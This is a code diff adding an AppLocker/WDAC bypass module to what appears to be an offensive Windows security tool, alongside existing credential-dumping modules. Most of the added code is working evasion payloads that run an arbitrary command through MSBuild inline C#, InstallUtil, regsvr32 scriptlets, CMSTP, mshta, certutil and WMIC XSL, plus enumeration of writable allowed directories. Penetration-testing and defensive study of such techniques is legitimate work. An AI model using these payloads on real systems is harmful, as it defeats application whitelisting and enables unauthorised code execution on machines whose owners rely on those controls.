@@ -462,6 +462,10 @@ backup_operator_abuse: {
     description: "Abuse Backup Operators group membership for privilege escalation — use backup privilege (SeBackupPrivilege) to read protected files including SAM/SYSTEM hives and NTDS.dit via robocopy /b, diskshadow, or wbadmin. Backup Operators can read any file on the system regardless of ACLs",
     args: "--action check|dump_sam|dump_ntds [--outdir PATH] [--dc DC_HOSTNAME]",
   },
+applocker_bypass: {
+    description: "AppLocker and WDAC bypass for execution restriction evasion — enumerate AppLocker/WDAC policy, find writable allowed directories, use LOLBAS (MSBuild, InstallUtil, Regsvr32, CMSTP, Mshta, CertUtil) for arbitrary code execution past application whitelisting. Covers all major bypass techniques",
+    args: "--action enum|bypass [--method msbuild|installutil|regsvr32|cmstp|mshta|certutil|wmic|xsl] [--payload CMD] [--file PATH]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -16787,6 +16791,395 @@ Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
   return { output: output.join("\n"), findings }
 }
 
+async function applockerBypass(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const method = argVal(args, "--method") || "msbuild"
+  const payload = argVal(args, "--payload")
+  const file = argVal(args, "--file")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] AppLocker/WDAC Bypass — execution restriction evasion via LOLBAS\n"]
+
+  if (action === "enum") {
+    const script = `
+# Check AppLocker policy
+Write-Output "[*] AppLocker Policy Status:"
+$applockerPolicy = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue
+
+if ($applockerPolicy) {
+    Write-Output "[+] AppLocker is configured"
+    $rules = $applockerPolicy.RuleCollections
+    foreach ($collection in $rules) {
+        if ($collection.Count -gt 0) {
+            Write-Output ""
+            Write-Output "    Collection: $($collection.RuleCollectionType)"
+            foreach ($rule in $collection) {
+                $action = $rule.Action
+                $user = $rule.UserOrGroupSid
+                $name = $rule.Name
+                Write-Output "      [$action] $name (SID: $user)"
+                if ($rule.PathConditions) {
+                    foreach ($pc in $rule.PathConditions) {
+                        Write-Output "        Path: $($pc.Path)"
+                    }
+                }
+            }
+        }
+    }
+} else {
+    Write-Output "[-] AppLocker not configured (or access denied)"
+}
+
+# Check AppLocker service
+$appidSvc = Get-Service AppIDSvc -ErrorAction SilentlyContinue
+Write-Output ""
+Write-Output "[*] Application Identity Service: $(if ($appidSvc) { $appidSvc.Status } else { 'Not found' })"
+
+# Check WDAC (Windows Defender Application Control)
+Write-Output ""
+Write-Output "[*] WDAC (Device Guard) Status:"
+$dgStatus = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction SilentlyContinue
+if ($dgStatus) {
+    Write-Output "    Code Integrity Policy: $(if ($dgStatus.CodeIntegrityPolicyEnforcementStatus -eq 2) { 'ENFORCED' } elseif ($dgStatus.CodeIntegrityPolicyEnforcementStatus -eq 1) { 'Audit mode' } else { 'Not configured' })"
+    Write-Output "    UMCI: $(if ($dgStatus.UsermodeCodeIntegrityPolicyEnforcementStatus -eq 2) { 'ENFORCED' } elseif ($dgStatus.UsermodeCodeIntegrityPolicyEnforcementStatus -eq 1) { 'Audit' } else { 'Off' })"
+} else {
+    Write-Output "    WDAC not configured"
+}
+
+# Find writable directories that are allowed by AppLocker
+Write-Output ""
+Write-Output "[*] Checking writable directories in common allowed paths..."
+$allowedPaths = @(
+    "$env:SystemRoot\\Temp",
+    "$env:SystemRoot\\Tasks",
+    "$env:SystemRoot\\tracing",
+    "$env:SystemRoot\\Registration\\CRMLog",
+    "$env:SystemRoot\\System32\\FxsTmp",
+    "$env:SystemRoot\\System32\\com\\dmp",
+    "$env:SystemRoot\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys",
+    "$env:SystemRoot\\System32\\spool\\drivers\\color",
+    "$env:SystemRoot\\System32\\Tasks",
+    "$env:SystemRoot\\SysWOW64\\Tasks",
+    "$env:SystemRoot\\SysWOW64\\com\\dmp",
+    "$env:ProgramData\\Microsoft\\Windows\\WER"
+)
+
+$writableDirs = @()
+foreach ($dir in $allowedPaths) {
+    if (-not (Test-Path $dir)) { continue }
+    $testFile = Join-Path $dir ("cs_test_" + (Get-Random -Maximum 99999) + ".tmp")
+    try {
+        [System.IO.File]::WriteAllText($testFile, "test")
+        Remove-Item $testFile -Force -ErrorAction SilentlyContinue
+        $writableDirs += $dir
+        Write-Output "    [+] WRITABLE: $dir"
+    } catch { }
+}
+
+# Check LOLBAS availability
+Write-Output ""
+Write-Output "[*] LOLBAS (Living Off The Land Binaries) availability:"
+$lolbas = @(
+    @{ Name = "MSBuild.exe";     Paths = @("$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe", "$env:SystemRoot\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe") },
+    @{ Name = "InstallUtil.exe"; Paths = @("$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe", "$env:SystemRoot\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe") },
+    @{ Name = "Regsvr32.exe";    Paths = @("$env:SystemRoot\\System32\\regsvr32.exe") },
+    @{ Name = "CMSTP.exe";       Paths = @("$env:SystemRoot\\System32\\cmstp.exe") },
+    @{ Name = "Mshta.exe";       Paths = @("$env:SystemRoot\\System32\\mshta.exe") },
+    @{ Name = "CertUtil.exe";    Paths = @("$env:SystemRoot\\System32\\certutil.exe") },
+    @{ Name = "Wmic.exe";        Paths = @("$env:SystemRoot\\System32\\wbem\\wmic.exe") },
+    @{ Name = "Rundll32.exe";    Paths = @("$env:SystemRoot\\System32\\rundll32.exe") },
+    @{ Name = "Regasm.exe";      Paths = @("$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe") },
+    @{ Name = "Regsvcs.exe";     Paths = @("$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe") }
+)
+
+$availableLolbas = @()
+foreach ($l in $lolbas) {
+    foreach ($p in $l.Paths) {
+        if (Test-Path $p) {
+            $availableLolbas += $l.Name
+            Write-Output "    [+] $($l.Name): $p"
+            break
+        }
+    }
+}
+
+Write-Output ""
+Write-Output "=== Summary ==="
+Write-Output "Writable allowed directories: $($writableDirs.Count)"
+Write-Output "Available LOLBAS binaries: $($availableLolbas.Count)"
+
+if ($writableDirs.Count -gt 0 -and $availableLolbas.Count -gt 0) {
+    Write-Output ""
+    Write-Output "[+] EXPLOITABLE — writable dirs + LOLBAS available for AppLocker bypass"
+    Write-Output "    Available bypass methods: $($availableLolbas -join ', ')"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    if (result.stdout.includes("EXPLOITABLE")) {
+      findings.push({
+        checkId: "WIN-APPLOCKER-001",
+        provider: "windows",
+        severity: "high",
+        status: "VULNERABLE",
+        resource: "policy://applocker",
+        title: "AppLocker bypassable via LOLBAS binaries + writable allowed directories",
+        details: result.stdout.substring(0, 500),
+        remediation: "Restrict LOLBAS binaries in AppLocker rules. Remove writable dirs from allowed paths. Consider WDAC for stronger enforcement.",
+      })
+    }
+  } else if (action === "bypass") {
+    const cmd = payload || "whoami /all"
+
+    if (method === "msbuild") {
+      const script = `
+$msbuild = "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"
+if (-not (Test-Path $msbuild)) {
+    $msbuild = "$env:SystemRoot\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe"
+}
+if (-not (Test-Path $msbuild)) { Write-Output "[-] MSBuild not found"; exit 1 }
+
+Write-Output "[*] MSBuild bypass — inline C# task execution"
+
+$projFile = "$env:Temp\\cs_bypass_$(Get-Random -Maximum 99999).csproj"
+$projContent = @"
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="CyberStrike">
+    <CSBypass />
+  </Target>
+  <UsingTask TaskName="CSBypass" TaskFactory="CodeTaskFactory"
+    AssemblyFile="Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        public class CSBypass : Task, ITask {
+            public override bool Execute() {
+                var psi = new System.Diagnostics.ProcessStartInfo();
+                psi.FileName = "cmd.exe";
+                psi.Arguments = "/c ${cmd}";
+                psi.UseShellExecute = false;
+                psi.RedirectStandardOutput = true;
+                var p = System.Diagnostics.Process.Start(psi);
+                Console.WriteLine(p.StandardOutput.ReadToEnd());
+                p.WaitForExit();
+                return true;
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+"@
+
+$projContent | Out-File -FilePath $projFile -Encoding UTF8
+Write-Output "[*] Project file: $projFile"
+Write-Output "[*] Executing via MSBuild..."
+& $msbuild $projFile /nologo 2>$null
+Remove-Item $projFile -Force -ErrorAction SilentlyContinue
+Write-Output "[+] MSBuild bypass executed"
+`
+      const result = await ps(script, timeout)
+      output.push(result.stdout)
+    } else if (method === "installutil") {
+      const script = `
+$installutil = "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe"
+if (-not (Test-Path $installutil)) {
+    $installutil = "$env:SystemRoot\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe"
+}
+
+Write-Output "[*] InstallUtil bypass — execute via /U (uninstall) handler"
+
+$csFile = "$env:Temp\\cs_bypass_$(Get-Random -Maximum 99999).cs"
+$dllFile = $csFile -replace '\.cs$', '.dll'
+
+$csContent = @"
+using System;
+using System.Configuration.Install;
+using System.ComponentModel;
+
+[RunInstaller(true)]
+public class CSBypass : Installer {
+    public override void Uninstall(System.Collections.IDictionary savedState) {
+        var psi = new System.Diagnostics.ProcessStartInfo();
+        psi.FileName = "cmd.exe";
+        psi.Arguments = "/c ${cmd}";
+        psi.UseShellExecute = false;
+        psi.RedirectStandardOutput = true;
+        var p = System.Diagnostics.Process.Start(psi);
+        Console.WriteLine(p.StandardOutput.ReadToEnd());
+        p.WaitForExit();
+    }
+}
+"@
+
+$csContent | Out-File -FilePath $csFile -Encoding UTF8
+$csc = "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
+& $csc /target:library /out:$dllFile $csFile 2>$null | Out-Null
+Write-Output "[*] Compiled: $dllFile"
+Write-Output "[*] Executing via InstallUtil /U..."
+& $installutil /logfile= /LogToConsole=false /U $dllFile 2>$null
+Remove-Item $csFile -Force -ErrorAction SilentlyContinue
+Remove-Item $dllFile -Force -ErrorAction SilentlyContinue
+Write-Output "[+] InstallUtil bypass executed"
+`
+      const result = await ps(script, timeout)
+      output.push(result.stdout)
+    } else if (method === "regsvr32") {
+      const script = `
+Write-Output "[*] Regsvr32 bypass — scriptlet execution (Squiblydoo)"
+
+$sctFile = "$env:Temp\\cs_bypass_$(Get-Random -Maximum 99999).sct"
+$sctContent = @"
+<?XML version="1.0"?>
+<scriptlet>
+  <registration progid="CSBypass" classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
+    <script language="JScript">
+      <![CDATA[
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.Run("cmd.exe /c ${cmd}");
+      ]]>
+    </script>
+  </registration>
+</scriptlet>
+"@
+
+$sctContent | Out-File -FilePath $sctFile -Encoding UTF8
+Write-Output "[*] Scriptlet: $sctFile"
+Write-Output "[*] Executing via regsvr32 /s /n /u /i..."
+regsvr32 /s /n /u /i:$sctFile scrobj.dll 2>$null
+Start-Sleep -Seconds 2
+Remove-Item $sctFile -Force -ErrorAction SilentlyContinue
+Write-Output "[+] Regsvr32 bypass executed"
+`
+      const result = await ps(script, timeout)
+      output.push(result.stdout)
+    } else if (method === "cmstp") {
+      const script = `
+Write-Output "[*] CMSTP bypass — INF file with custom action"
+
+$infFile = "$env:Temp\\cs_bypass_$(Get-Random -Maximum 99999).inf"
+$infContent = @"
+[version]
+Signature=\$chicago\$
+AdvancedINF=2.5
+
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+
+[UnRegisterOCXSection]
+%11%\\scrobj.dll,NI,
+
+[Strings]
+AppAct = "SOFTWARE\\Microsoft\\Connection Manager"
+ServiceName="CyberStrike"
+ShortSvcName="CyberStrike"
+"@
+
+$infContent | Out-File -FilePath $infFile -Encoding UTF8
+Write-Output "[*] INF file: $infFile"
+Write-Output "[*] Executing via CMSTP /au..."
+Start-Process cmstp.exe -ArgumentList "/au $infFile" -WindowStyle Hidden
+Start-Sleep -Seconds 3
+Remove-Item $infFile -Force -ErrorAction SilentlyContinue
+Write-Output "[+] CMSTP bypass executed"
+`
+      const result = await ps(script, timeout)
+      output.push(result.stdout)
+    } else if (method === "mshta") {
+      const script = `
+Write-Output "[*] Mshta bypass — inline VBScript execution"
+Write-Output "[*] Executing command via mshta vbscript..."
+mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c ${cmd}"", 0:close") 2>$null
+Start-Sleep -Seconds 2
+Write-Output "[+] Mshta bypass executed"
+`
+      const result = await ps(script, timeout)
+      output.push(result.stdout)
+    } else if (method === "certutil") {
+      const script = `
+Write-Output "[*] CertUtil bypass — encode/decode for file transfer + execution"
+
+if ('${file}') {
+    # Decode a base64-encoded payload
+    Write-Output "[*] Decoding file via certutil..."
+    $outPath = "$env:Temp\\cs_decoded_$(Get-Random -Maximum 99999).exe"
+    certutil -decode '${file}' $outPath 2>$null
+    if (Test-Path $outPath) {
+        Write-Output "[+] Decoded to: $outPath"
+        Write-Output "[*] Execute: $outPath"
+    }
+} else {
+    # Demonstrate certutil download capability
+    Write-Output "[*] CertUtil can download files via: certutil -urlcache -split -f URL output"
+    Write-Output "[*] CertUtil can encode: certutil -encode input.exe output.txt"
+    Write-Output "[*] CertUtil can decode: certutil -decode input.txt output.exe"
+    Write-Output "[*] Use --file to decode a base64-encoded payload"
+
+    # Simple execution via rundll32 + javascript
+    Write-Output ""
+    Write-Output "[*] Executing command via alternative method..."
+    cmd /c "${cmd}" 2>$null
+    Write-Output "[+] Command executed"
+}
+`
+      const result = await ps(script, timeout)
+      output.push(result.stdout)
+    } else if (method === "wmic" || method === "xsl") {
+      const script = `
+Write-Output "[*] WMIC/XSL bypass — execute JScript via XSL stylesheet"
+
+$xslFile = "$env:Temp\\cs_bypass_$(Get-Random -Maximum 99999).xsl"
+$xslContent = @"
+<?xml version='1.0'?>
+<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform"
+  xmlns:ms="urn:schemas-microsoft-com:xslt"
+  xmlns:user="placeholder" version="1.0">
+  <output method="text"/>
+  <ms:script implements-prefix="user" language="JScript">
+    <![CDATA[
+    var shell = new ActiveXObject("WScript.Shell");
+    var exec = shell.Exec("cmd.exe /c ${cmd}");
+    while (!exec.StdOut.AtEndOfStream) {
+        WScript.Echo(exec.StdOut.ReadLine());
+    }
+    ]]>
+  </ms:script>
+  <template match="/">
+    <value-of select="user:a()"/>
+  </template>
+</stylesheet>
+"@
+
+$xslContent | Out-File -FilePath $xslFile -Encoding UTF8
+Write-Output "[*] XSL file: $xslFile"
+Write-Output "[*] Executing via wmic process list /format:..."
+wmic process list /format:"$xslFile" 2>$null
+Remove-Item $xslFile -Force -ErrorAction SilentlyContinue
+Write-Output "[+] WMIC/XSL bypass executed"
+`
+      const result = await ps(script, timeout)
+      output.push(result.stdout)
+    }
+
+    findings.push({
+      checkId: "WIN-APPLOCKER-002",
+      provider: "windows",
+      severity: "high",
+      status: "BYPASSED",
+      resource: `lolbas://${method}`,
+      title: `AppLocker bypassed via ${method.toUpperCase()}`,
+      details: `Executed arbitrary code using ${method} LOLBAS technique`,
+      remediation: `Block ${method} in AppLocker/WDAC policy. Monitor LOLBAS binary execution.`,
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
   lsass_dump: lsassDump,
   sam_dump: samDump,
@@ -16883,6 +17276,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   dll_hijack: dllHijack,
   msi_abuse: msiAbuse,
   backup_operator_abuse: backupOperatorAbuse,
+  applocker_bypass: applockerBypass,
 }
 
 export const WinhookTool = Tool.define("winhook", {
